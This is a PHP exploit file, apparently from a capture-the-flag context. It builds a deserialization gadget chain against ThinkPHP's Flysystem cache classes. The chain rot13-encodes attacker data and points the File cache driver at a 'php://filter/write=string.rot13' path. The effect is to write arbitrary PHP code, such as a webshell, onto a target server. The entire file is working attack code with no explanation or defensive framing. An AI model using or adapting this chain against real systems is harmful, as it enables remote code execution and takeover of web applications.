<?php
namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache {
        protected $complete;
        protected $cache = [];
        protected $autosave = false;

        public function __construct($data)
        {
            $this->complete = \str_rot13($data);
        }
    }
}

namespace think\filesystem {
    class CacheStore extends \League\Flysystem\Cached\Storage\AbstractCache {
        protected $store;
        protected $key;
        protected $expire;

        public function __construct($path, $data)
        {
            parent::__construct($data);
            $this->key = "syclover";
            $this->expire = 1;
            $this->store = new \think\cache\driver\File($path);
        }
    }
}

namespace think\cache {
    abstract class Driver {
        protected $writeTimes = 0;
    }
}

namespace think\cache\driver {
    class File extends \think\cache\Driver {
        protected $options;

        public function __construct($path)
        {
            $this->options = [
                'expire'        => 0,
                'cache_subdir'  => false,
                'prefix'        => '',
                'path'          => "php://filter/write=string.rot13/resource=$path",
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => [],
            ];
        }
    }
}